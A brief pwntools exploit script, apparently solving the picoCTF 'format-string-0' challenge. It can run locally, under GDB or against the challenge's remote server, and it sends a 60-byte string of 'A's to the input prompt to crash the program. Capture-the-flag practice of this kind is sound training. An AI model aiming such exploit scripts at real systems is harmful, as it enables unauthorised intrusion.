#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("format-string-0")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("mimas.picoctf.net", 60016)
    else:
        return process(elf.path)

io = start()

io.sendlineafter(b"Enter your recommendation: ", b"A"*60)

io.interactive()
